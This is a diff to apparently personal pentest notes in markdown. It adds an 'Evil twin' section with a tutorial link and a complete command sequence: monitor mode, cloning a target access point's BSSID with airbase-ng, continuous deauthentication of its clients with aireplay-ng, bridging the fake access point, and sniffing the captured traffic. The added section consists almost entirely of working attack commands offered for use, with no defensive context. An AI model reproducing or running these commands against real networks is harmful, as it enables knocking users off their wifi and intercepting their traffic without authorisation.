@@ -113,6 +113,29 @@ do
 done
 ```
 
+# Evil twin  
+[more info](http://www.kalitutorials.net/2014/07/evil-twin-tutorial.html)
+`ifconfig wlan0 down`  
+`iwconfig wlan0 mode monitor`  
+`airmon-ng check wlan0`  
+kill processes that are running nm first    
+`airodump-ng wlan0`  
+take mac addess you want to clone  
+`airbase-ng -a <bssid> --essid thename -c 6 wlan0`  
+**do not shut down airbase**
+deauthenticate the network  
+`aireplay-ng -0 0 -a <bssid> wlan0`  
+
+##### if not already installed install
+`apt-get install bridge-utils -y`  
+`brctl addbr evil`  
+`brctl addif evil at0`  
+`ifconfig at0 0.0.0.0 up`  
+`ifconfig evil up`  
+`dhclient evil &`  
+
+##### listen to traffic  
+* install wireshark  
 
 
 
